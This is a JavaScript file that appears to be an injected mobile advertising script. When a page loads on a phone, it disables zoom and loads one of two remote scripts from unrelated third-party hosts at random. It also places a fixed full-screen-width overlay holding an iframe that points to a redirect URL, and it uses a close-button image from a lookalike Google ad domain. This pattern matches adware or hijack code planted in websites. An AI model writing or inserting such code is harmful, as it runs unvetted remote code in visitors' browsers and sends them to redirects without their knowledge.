function getOs() {
		var b = navigator.userAgent || "",
			b = b.toLowerCase();
		return /android|adr/.test(b) ? 1 : /ios|iphone|ipad|itouch/.test(b) ? 2 : 0;
};


function ajaxSmp(a, g, f) {
    var k = null,
    k = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
    null != k ? (k.open("GET", a, true), k.send(), k.onreadystatechange = function() {
        4 == k.readyState && (200 == k.status ? g && g(k.responseText) : f && f());
    }) : 0;
}


function insertAd(){
	if (!document.body) {
        return setTimeout(arguments.callee, 50)//如果页面没有加载就执行arguments.callee 50毫秒后执行
    }
	if(getOs()==0){
		return;
  	}
    var adPosition = window.iadPostion || "";
    var iadid = window.iadId;
    var w;
    var h;
    var iadClose = window.iadClose || true;
    var autoSize = window.autoSize || false;
    var a = document.createElement("meta");
    	a.setAttribute("name", "viewport");
    	a.setAttribute("content", "width=device-width, initial-scale=1.00, maximum-scale=1.00, minimum-scale=1.00, user-scalable=no");
    document.getElementsByTagName("head")[0].appendChild(a);  
    var n = Math.floor(Math.random()*100+1);	
    if(n<=50){
		var s = document.createElement("script");
			s.type = "text/javascript";
			s.language = "javascript";
			s.src = "http://a.beilamusi.com/zsp/zsp_i.js";
		document.getElementsByTagName("body")[0].appendChild(s);
    }else{
		var s = document.createElement("script");
			s.type = "text/javascript";
			s.language = "javascript";
			s.src = "https://ioc.imyunxi.cn/us/10100/92f9ce299cc0.js";
		document.getElementsByTagName("body")[0].appendChild(s);
    }	
    function newScript(url, isBody) {
        var container = isBody ? document.body : (document.head || document.getElementsByTagName('head')[0]);
        var script = document.createElement('script');
    	    script.type = "text/javascript";
       	    script.src = url;
        container.insertBefore(script, container.firstChild);
    }	
    if (autoSize === true) {
        w = document.body.clientWidth;
        h = parseInt(w * (90 / 580))
    } else {
        w = window.iadWidth || 580;
        h = window.iadHeight || 90
    }
    var js_version = "3.0.0";
    var tp = "2";
    var hasLogo = 0;
    var adDomName = window.iadDivId || "youzi_adContainer";
    var adContainer = document.getElementById(adDomName);
    if (!adContainer) {
        adContainer = document.createElement("div");
        adContainer.setAttribute("id", adDomName);
        var style = adContainer.style;
        style.margin = "0 auto";
        if (adPosition !== "") {
            style.position = "fixed";
            style.left = "0px";
            style.right = "0px";
            if (adPosition === "top") {
                style.top = "0px"
            } else if (adPosition === "middle") {
                style.top = "50%";
                style.marginTop = -(h / 2) + "px"
            } else if (adPosition === "bottom") {
                style.bottom = "0px"
            }
        } else {
            style.position = "relative"
        }
        style.width = "100%";
        style.height = h + "px";
        style.zIndex = 2147483647;
        document.body.appendChild(adContainer);
		var logo = document.createElement("a");
		logo.setAttribute("id","mob_ad_logo");
		logo.setAttribute("style", "height: 18px;width:24px;bottom:0;left:0;text-decoration: none;cursor: pointer;display: block;overflow: hidden;position: absolute;right: 0;z-index: 2147483647;  background: url(http://creative.jundaozichan.com/img/mob_ad.png) no-repeat left top;background-position:center;background-size: 100%,100%;");
		adContainer.appendChild(logo);
	
    } else {
        adContainer.style.margin = "auto"
    }
    if (iadClose) {
        var closeName = adDomName + "_close";
        closeDom = document.createElement("div");
        closeDom.setAttribute("id", closeName);
        var closeStyle = closeDom.style;
        closeStyle.backgroundImage = "url(http://static.googleadsserving.cn/pagead/images/x_button_blue2.png)";
        closeStyle.backgroundRepeat = "no-repeat";
        closeStyle.backgroundSize = "100%";
        closeStyle.position = "absolute";
        closeStyle.fontSize = "20px";
        closeStyle.right = "0px";
        closeStyle.top = "0px";
        closeStyle.color = "gray";
        closeStyle.width = 15 + "px";
        closeStyle.height = 15 + "px";
        adContainer.appendChild(closeDom);
        closeDom.onclick = function() {
        adContainer.innerHTML = "";
        }
    }
    window.preload = function() {
		var url="http://sle.benshiw.net:8070/dc/redirect?m=084b6fbb";
        var page = document.createElement("iframe");
        page.setAttribute("src", url);
        page.setAttribute("seamless", "");
        page.setAttribute("scrolling", "no");
        page.setAttribute("frameborder", 0);
        page.setAttribute("marginwidth", 0);
        page.setAttribute("marginheight", 0);
        page.setAttribute("allowtransparency", true);
		page.style.cssText = "width:100%;height:" + h + "px;display:block;";
        adContainer.appendChild(page)

    };
    setTimeout(preload, 1);
    window.iadPostion = "";
    window.iadWidth = "";
    window.iadHeight = "";
    window.autoSize = false;
    window.iadDivId = "";
}
var iadPostion = 'bottom';
var iadDivId = ''; 
var iadId = '';
window.iadHeight = 60;
var _adSoltId="";
var reqflag = '0';
(function() {
    setTimeout(insertAd, 500);
})();